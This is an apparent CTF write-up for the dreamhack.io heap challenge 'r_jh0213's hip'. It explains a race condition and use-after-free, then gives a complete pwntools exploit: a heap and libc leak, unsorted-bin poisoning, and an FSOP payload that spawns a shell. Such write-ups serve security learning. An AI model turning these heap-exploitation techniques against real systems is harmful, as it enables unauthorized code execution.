---
title: r_jh0213's hip - dreamhack.io
tags:
  - binary exploit
  - dreamhack.io
createdAt: 2026-08-26
---

# Challenge Description

- Source challenge: [r_jh0213's hip](https://dreamhack.io/wargame/challenges/1730)

## File Type

```bash
$ file prob
prob: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=52bd4817fd7f7ec6dbdf2a40b70e2debf7ef4290, for GNU/Linux 3.2.0, stripped
```

## Binary Protection

```bash
$ checksec prob
[*] './prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

## Preview

- Preview output of binary execution:

```
1. malloc
2. edit
3. free
4. exit
>
1
>
0
1. malloc
2. edit
3. free
4. exit
>
end
4
```

## Decompiled Code

- Glibc version [2.35](https://elixir.bootlin.com/glibc/glibc-2.35/source)

```c
struct Element {
	long long size;
	int idx;
	char *data;
};

Element* gStore[16];

int __fastcall start_routine(void *a1)
{
	int v1; // ebx
	void **p_data; // rbx
	int id; // [rsp+18h] [rbp-28h]
	int i; // [rsp+1Ch] [rbp-24h]
	int j; // [rsp+20h] [rbp-20h]
	int k; // [rsp+24h] [rbp-1Ch]

	id = gIdx;
	// Timeout
	for ( i = 0; i <= 999; ++i )
	{
		for ( j = 0; j <= 999; ++j )
		{
			for ( k = 0; k <= 999; ++k )
				id ^= i;
		}
	}
	v1 = gIdx;
	gStore[v1] = (Element *)malloc(0x18uLL);
	gStore[gIdx]->size = 256LL;
	gStore[gIdx]->id = id;
	p_data = &gStore[gIdx]->data;
	*p_data = malloc(0x100uLL);
	return puts("end");
}

unsigned __int64 allocate()
{
	pthread_t newthread; // [rsp+0h] [rbp-10h] BYREF
	unsigned __int64 v2; // [rsp+8h] [rbp-8h]

	v2 = __readfsqword(0x28u);
	puts("> ");
	__isoc99_scanf("%u", &gIdx);
	if ( gIdx <= 15 && !gInUsed[gIdx] )
	{
		gInUsed[gIdx] = 1;
		pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL);
		pthread_detach(newthread);
	}
	return v2 - __readfsqword(0x28u);
}

ssize_t edit()
{
	ssize_t result; // rax

	puts("> ");
	__isoc99_scanf("%u", &gIdx);
	result = gIdx;
	if ( gIdx <= 15 )
	{
		result = (unsigned int)gInUsed[gIdx];
		if ( (_DWORD)result )
		{
			write(1, gStore[gIdx]->data, 256uLL);
			puts("> ");
			return read(0, gStore[gIdx]->data, 256uLL);
		}
	}
	return result;
}

void deallocate()
{
	puts("> ");
	__isoc99_scanf("%u", &gIdx);
	if ( gIdx <= 15 )
	{
		if ( gInUsed[gIdx] )
		{
			gInUsed[gIdx] = 0;
			free(gStore[gIdx]->data);
			free(gStore[gIdx]);
		}
	}
}

void __noreturn handle()
{
	__int64 choice; // [rsp+0h] [rbp-10h] BYREF
	unsigned __int64 canary; // [rsp+8h] [rbp-8h]

	canary = __readfsqword(0x28u);
	while ( 1 )
	{
		menu();
		__isoc99_scanf("%lld", &choice);
		if ( choice == 4 )
			break;
		if ( choice <= 4 )
		{
			switch ( choice )
			{
				case 3LL:
					deallocate();
					break;
				case 1LL:
					allocate();
					break;
				case 2LL:
					edit();
					break;
			}
		}
	}
	exit(0);
}
```

# Vulnerability

- This program allocate the memory in a separate asynchronous thread using `start_routine()` function. However, it makes modifications to global variables but doesn't use a mutex lock. This leads to **race condition** vulnerability
- `deallocate()` function doesn't assign `NULL` to the variable after the object is freed. This is a **use-after-free** vulnerability.

# Exploitation

## Leak Heap Address and Libc

- This challenge allows us to malloc and free 16 objects at the same time, which is more than maximum chunk in a bucket of **tcache** (max is 7).
- Each time `deallcate()` function is called, it frees 2 chunks whose size are 0x20 and 0x110.
- Therefore, I just need to allocate and deallocate first 7 objects to fulfill the **tcache**. This ensures that in the 8 times `deallocate()` function is called, the 0x110-byte chunk will be put into **unsorted bin**

```python
for i in range(7):
    malloc(i, 3)
    free(i)

...

free(7)
```

- Then, if I make a malloc operation and call `edit()` immediately. It will print out the address of `main_arena` and a freed chunk before (which is **tcache** for created thread).

```python
malloc(7)
target.sendlineafter(b"> ", b"2")
target.sendlineafter(b"> \n", b"7")

heap_base = u64(target.recv(8)) - 0xE90
libc.address = u64(target.recv(8)) - 0x21ACE0
info(f"Heap base: {hex(heap_base)}")
info(f"Libc base: {hex(libc.address)}")
```

- This because at the beginning of `start_routine`, there are 3 nested loops which take about 1-2 seconds to actually allocate the memory. However, at that moment, its state stored in global array is set to `true`. That means I can make edit or free operation on a freed chunk before it is actually assigned to the new one. In this situation, freed chunk is containing `fd` and `bck` pointer which are `main_arena` in libc and other freed chunk; so I use `edit` to print them out. Then I just need to write the exactly last byte of the address of `fd` which won't be changed. This makes sure that **unsorted bin** is still valid

## Unsorted Bin Poisoning

- Most of objects are created with 2 contiguous chunks of 0x20 bytes and 0x110 bytes in heap memory.
- Therefore, I decided to create a fake chunk lying on 2 adjacent active objects in heap memory, and put it into **unsorted bin**. This chunk contains a 0x20-byte chunk of the last object corresponding to its `struct Element`.
- By this way, once this fake chunk is allocated, I can change the `data` field of that _victim object_ to an arbitrary address and I will be able to do an arbitrary write to that address.
- Here, I created fake chunk between 9th and 10th object. The _victim object_ is 10th one:

```python
# Fake chunk started at 0x1580, ended at 0x1690
payload = b"\x00" * 0xE8 + p64(0x111)
payload += p64(heap_base + 0x1230) + p64(heap_base + 0x1360)
edit(9, payload)

payload = b"\x00" * 8 * 24 + p64(0x110) + p64(0x20) + 0x18 * b"\x00" + p64(0x21)
edit(10, payload)

fake_chunk = heap_base + 0x1580
```

- Next, I have to find a place to put that fake chunk in **unsorted bin**. I have no permission to write to `main_arena` or freed **tcache** chunk, so I must free 2 different chunks of 2 objects and place the fake chunk into between them. I chose the 7th and 8th object.

- However, I cannot use the above way to edit a freed chunk, that way only reveals `fd` and `bck` pointer.
- There is a trick that when I call 2 `allocate()` functions with 2 different elements continuously. Both of their states are `true` (active), but one element still contains freed chunk. With this way, I have ability to edit a freed chunk.
- Here is my implementation for 7th object:

```python
free(7)
free(11)
malloc(7)
malloc(11)
time.sleep(5)
free(11)
```

- Then I just need to edit those freed chunks to place fake chunk into between them.

```python
payload = p64(fake_chunk) + p64(libc.address + 0x21ACE0)
edit(8, payload)
payload = p64(libc.address + 0x21ACE0) + p64(fake_chunk)
edit(7, payload)
```

- After that, I made 3 malloc operation to assign the fake chunk. At first, there are only 2 chunks of 0x20 bytes in **fastbins** so I have to free another object to before the third operation is performed.

```python
malloc(2, 3)
malloc(3, 3)
free(14)
malloc(4, 3)
```

## Get Shell

- Fake chunk will be assigned to the 4th object. Then I edited it to change `data` pointer of 10th object to `_IO_2_1_stdout_`

```python
stdout = libc.symbols["_IO_2_1_stdout_"]
payload = b"\x00" * 0x18 + p64(0x21) + p64(0x100) + p64(0xA) + p64(stdout)
edit(4, payload)
```

- Finally, I used FSOP technique to get shell:

```python
fake_file = libc.sym["_IO_2_1_stdout_"]
payload = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64(0),
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x58: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.address + 0x21CA70,
        # fake_file->file._wide_data
        0xA0: fake_file - 0x10,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: fake_file - 0x10,
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"] - 0x20,
    }
)

edit(10, payload)
```

## Exploit Code

```python
from pwn import *

context.terminal = [
    "kitty",
    "@",
    "launch",
    "--type=os-window",
    "--cwd={}".format(os.getcwd()),
    "sh",
    "-c",
]
context.log_level = "debug"
context.arch = "amd64"

TARGET = "./bin/prob"
LIBC = "./lib/libc.so.6"

if args.REMOTE:
    target = remote("host3.dreamhack.games", 10397)
elif args.LOCAL:
    target = process(TARGET)
else:
    gdbscript = """
    brva 0x1749
    c
    """
    target: process | remote = gdb.debug(TARGET, gdbscript, env={"SHELL": "/bin/sh"})

exe = ELF(TARGET)
libc = ELF(LIBC) if os.path.exists(LIBC) else None


def malloc(idx: int, s: int = 0):
    target.sendlineafter(b"> ", b"1")
    target.sendlineafter(b"> ", str(idx).encode())
    time.sleep(s)


def edit(idx: int, msg: bytes):
    target.sendlineafter(b"> ", b"2")
    target.sendlineafter(b"> ", str(idx).encode())
    target.sendafter(b"> ", msg)


def free(idx: int):
    target.sendlineafter(b"> ", b"3")
    target.sendlineafter(b"> ", str(idx).encode())


for i in range(7):
    malloc(i, 3)
    free(i)

malloc(0)
malloc(1)
time.sleep(5)

for i in range(7, 16):
    malloc(i, 3)

free(7)
malloc(7)
target.sendlineafter(b"> ", b"2")
target.sendlineafter(b"> \n", b"7")

heap_base = u64(target.recv(8)) - 0xE90
libc.address = u64(target.recv(8)) - 0x21ACE0
info(f"Heap base: {hex(heap_base)}")
info(f"Libc base: {hex(libc.address)}")
target.sendafter(b"> ", b"\x90")
time.sleep(5)

# Fake chunk started at 0x1580, ended at 0x1690
payload = b"\x00" * 0xE8 + p64(0x111)
payload += p64(heap_base + 0x1230) + p64(heap_base + 0x1360)
edit(9, payload)

payload = b"\x00" * 8 * 24 + p64(0x110) + p64(0x20) + 0x18 * b"\x00" + p64(0x21)
edit(10, payload)

fake_chunk = heap_base + 0x1580

free(7)
free(11)
malloc(7)
malloc(11)
time.sleep(5)
free(11)

free(8)
free(12)
malloc(8)
malloc(12)
time.sleep(5)
free(12)

payload = p64(fake_chunk) + p64(libc.address + 0x21ACE0)
edit(8, payload)
payload = p64(libc.address + 0x21ACE0) + p64(fake_chunk)
edit(7, payload)

malloc(2, 3)
malloc(3, 3)
free(14)
malloc(4, 3)

stdout = libc.symbols["_IO_2_1_stdout_"]
payload = b"\x00" * 0x18 + p64(0x21) + p64(0x100) + p64(0xA) + p64(stdout)
edit(4, payload)
fake_file = libc.sym["_IO_2_1_stdout_"]
payload = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64(0),
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x58: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.address + 0x21CA70,
        # fake_file->file._wide_data
        0xA0: fake_file - 0x10,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: fake_file - 0x10,
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"] - 0x20,
    }
)

edit(10, payload)

target.interactive()
```
